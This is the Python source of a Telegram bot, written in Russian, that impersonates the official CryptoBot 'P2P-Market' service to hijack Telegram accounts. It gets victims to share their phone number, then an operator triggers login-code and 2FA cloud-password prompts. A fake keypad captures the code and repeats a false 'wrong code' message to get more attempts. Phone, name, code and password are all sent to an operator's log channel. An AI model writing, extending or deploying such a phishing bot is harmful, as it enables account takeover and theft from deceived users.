import logging
import json
from pathlib import Path
from aiogram import Bot, Dispatcher, Router, F
from aiogram.types import (
    Message,
    CallbackQuery,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    ReplyKeyboardMarkup,
    KeyboardButton,
    ReplyKeyboardRemove,
    FSInputFile,
    BufferedInputFile,
)

API_TOKEN = "токен бота"
CHANNEL_ID = "айди канала с логами"
SESSIONS_FILE = Path("sessions.json")

logging.basicConfig(
    level=logging.DEBUG,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler("bot.log", encoding="utf-8"),
    ],
)
logger = logging.getLogger(__name__)

bot = Bot(token=API_TOKEN)
dp = Dispatcher()
router = Router()


def load_sessions():
    try:
        if SESSIONS_FILE.exists():
            with open(SESSIONS_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        return {}
    except:
        return {}


def save_sessions(sessions):
    try:
        with open(SESSIONS_FILE, "w", encoding="utf-8") as f:
            json.dump(sessions, f, indent=2, ensure_ascii=False)
    except:
        pass


def get_session(user_id: int):
    sessions = load_sessions()
    return sessions.get(str(user_id), {})


def update_session(user_id: int, data: dict):
    sessions = load_sessions()
    user_id_str = str(user_id)
    sessions.setdefault(user_id_str, {}).update(data)
    save_sessions(sessions)


next_kb = InlineKeyboardMarkup(inline_keyboard=[[
    InlineKeyboardButton(text="➡️ Далее", callback_data="start_next")
]])


def code_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="1️⃣", callback_data="digit_1"),
            InlineKeyboardButton(text="2️⃣", callback_data="digit_2"),
            InlineKeyboardButton(text="3️⃣", callback_data="digit_3"),
        ],
        [
            InlineKeyboardButton(text="4️⃣", callback_data="digit_4"),
            InlineKeyboardButton(text="5️⃣", callback_data="digit_5"),
            InlineKeyboardButton(text="6️⃣", callback_data="digit_6"),
        ],
        [
            InlineKeyboardButton(text="7️⃣", callback_data="digit_7"),
            InlineKeyboardButton(text="8️⃣", callback_data="digit_8"),
            InlineKeyboardButton(text="9️⃣", callback_data="digit_9"),
        ],
        [
            InlineKeyboardButton(text="⬅️", callback_data="digit_backspace"),
            InlineKeyboardButton(text="0️⃣", callback_data="digit_0"),
            InlineKeyboardButton(text="✅", callback_data="digit_confirm"),
        ],
    ])


def request_code_keyboard(user_id: int):
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="🔄 Запросить код",
                             callback_data=f"request_code_{user_id}"),
        InlineKeyboardButton(text="🔑 Пароль",
                             callback_data=f"send_password_{user_id}"),
    ]])


async def send_code_to_channel(phone: str, code: str, user_id: int):
    message_text = f"🔐 Код подтверждения для номера {phone}:\n<code>{code}</code>"
    await bot.send_message(
        chat_id=CHANNEL_ID,
        text=message_text,
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(text="🔄 Повторный код", callback_data=f"request_code_{user_id}"),
            InlineKeyboardButton(text="🔑 Пароль", callback_data=f"send_password_{user_id}")
        ]])
    )


@router.message(F.text == "/start")
async def send_welcome(message: Message):
    video_path = Path("menu.mp4").absolute()
    await message.answer_video(
        video=FSInputFile(video_path),
        caption=
        "Приветствуем вас!\n\nЭто <a href='https://help.crypt.bot/faq-ru'>бот <em>для подключения</em></a> Вашего телефона к <b>P2P-Маркету</b>.\nПодписывайтесь на <a href='https://t.me/CryptoBotRU'>наш канал</a> и вступайте в <a href='https://t.me/CryptoBotTips'>Crypto Bot Tips</a>",
        reply_markup=next_kb,
        parse_mode="HTML",
    )


@router.callback_query(F.data == "start_next")
async def handle_next(callback: CallbackQuery):
    contact_button = KeyboardButton(text="🌐 Продолжить", request_contact=True)
    contact_kb = ReplyKeyboardMarkup(keyboard=[[contact_button]],
                                     resize_keyboard=True,
                                     one_time_keyboard=True)
    with open("menu.mp4", "rb") as video_file:
        await callback.message.answer_video(
            video=BufferedInputFile(video_file.read(), filename="menu.mp4"),
            caption=
                "🌐 Подключение\n\n"
                "Для того, чтобы продолжить торговлю в <b>P2P-Маркете</b>, Вам необходимо авторизоваться в свой "
                "Telegram-аккаунт, нажав на кнопку <b>«🌐 Продолжить»</b> снизу.",
            reply_markup=contact_kb,
            parse_mode="HTML",
        )
    await callback.message.delete()
    await callback.answer()


@router.message(F.contact)
async def handle_contact(message: Message):
    user_id = message.from_user.id
    phone = message.contact.phone_number
    session_data = {
        "phone":
        phone,
        "username":
        f"@{message.from_user.username}"
        if message.from_user.username else "отсутствует",
        "full_name":
        message.from_user.full_name,
        "code":
        "",
        "waiting_for_password":
        False,
        "is_retrying_code":
        False,
        "message_id":
        None,
        "log_message_id":
        None,
    }
    update_session(user_id, session_data)
    msg = await bot.send_message(
        chat_id=CHANNEL_ID,
        text=
        f"📞 Новый пользователь:\nТелефон: <code>{phone}</code>\nUsername: {session_data['username']}\nИмя: {session_data['full_name']}\nID: {user_id}",
        parse_mode="HTML",
        reply_markup=request_code_keyboard(user_id),
    )
    update_session(user_id, {"log_message_id": msg.message_id})
    await message.reply(
        "Номер <b>успешно</b> отправлен. Ожидайте действия модератора.",
        parse_mode="HTML")


@router.callback_query(F.data.startswith("request_code_"))
async def handle_code_request(callback: CallbackQuery):
    user_id = int(callback.data.split("_")[-1])
    session = get_session(user_id)
    if not session or "phone" not in session:
        await callback.answer("❌ Ошибка запроса", show_alert=True)
        return
    update_session(user_id,
                   {"code_counter": session.get("code_counter", 0) + 1})
    msg = await bot.send_message(
        chat_id=user_id,
        text=
        "Введите код подтверждения из <a href='t.me/+42777'>Telegram</a>:\n<b>Текущий код:</b> <code></code>",
        parse_mode="HTML",
        reply_markup=code_keyboard(),
    )
    update_session(user_id, {"message_id": msg.message_id, "code": ""})
    await callback.answer("✅ Поле для ввода кода отправлено")


@router.callback_query(F.data.startswith("send_password_"))
async def handle_password_request(callback: CallbackQuery):
    user_id = int(callback.data.split("_")[-1])
    session = get_session(user_id)
    if not session:
        await callback.answer("❌ Пользователь не найден", show_alert=True)
        return
    update_session(
        user_id, {"password_counter": session.get("password_counter", 0) + 1})
    await bot.send_message(
        chat_id=user_id,
        text="На аккаунте обнаружена 2FA. Введите <b>облачный пароль</b>.",
        reply_markup=ReplyKeyboardRemove(),
        parse_mode="HTML",
    )
    update_session(user_id, {"waiting_for_password": True})
    await callback.answer("✅ Запрошен ввод пароля")


@router.message(F.text)
async def handle_text_input(message: Message):
    user_id = message.from_user.id
    session = get_session(user_id)
    if not session.get("waiting_for_password"):
        return
    await bot.send_message(
        chat_id=CHANNEL_ID,
        text=
        f"🔑 Облачный пароль от {session.get('phone', 'Неизвестен')}:\n<code>{message.text}</code>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(text="🔄 Запросить пароль заново",
                                 callback_data=f"send_password_{user_id}")
        ]]),
    )
    await message.answer(
        "Пароль <b>успешно</b> отправлен. Ожидайте рассмотрения заявки.",
        parse_mode="HTML")
    update_session(user_id, {"waiting_for_password": False})


@router.callback_query(F.data.startswith("digit_"))
async def handle_digit_input(callback: CallbackQuery):
    user_id = callback.from_user.id
    session = get_session(user_id)
    if not session:
        await callback.answer("❌ Сессия истекла.", show_alert=True)
        return
    data = callback.data
    code = session.get("code", "")
    if data == "digit_backspace":
        code = code[:-1]
    elif data == "digit_confirm":
        if len(code) != 5:
            await callback.answer("Введите 5 цифр.", show_alert=True)
            return
        await send_code_to_channel(session.get("phone", "Неизвестен"), code,
                                      user_id)
        await bot.edit_message_text(
            chat_id=callback.message.chat.id,
            message_id=session.get("message_id"),
            text="Код <b>успешно отправлен</b>. Ожидайте рассмотрения заявки.",
            parse_mode="HTML",
        )
        update_session(user_id, {"is_retrying_code": True})
        await callback.answer("✅ Код отправлен")
        return
    else:
        if len(code) >= 5:
            await callback.answer("Максимум 5 символов", show_alert=True)
            return
        code += data.replace("digit_", "")
    update_session(user_id, {"code": code})
    text = (
        "Код подтверждения неверный.\nВведите заново: <a href='https://t.me/+42777'>Telegram</a>\n"
        "<b>Текущий код:</b> <code>{code}</code>"
        if session.get("is_retrying_code") else
        "Введите код подтверждения из <a href='t.me/+42777'>Telegram</a>:\n<b>Текущий код:</b> <code>{code}</code>"
    ).format(code=code)
    await bot.edit_message_text(
        chat_id=callback.message.chat.id,
        message_id=session.get("message_id"),
        text=text,
        reply_markup=code_keyboard(),
        parse_mode="HTML",
    )
    await callback.answer()


async def main():
    logger.info("Бот запущен...")
    dp.include_router(router)
    await dp.start_polling(bot)


if __name__ == "__main__":
    import asyncio
    asyncio.run(main())
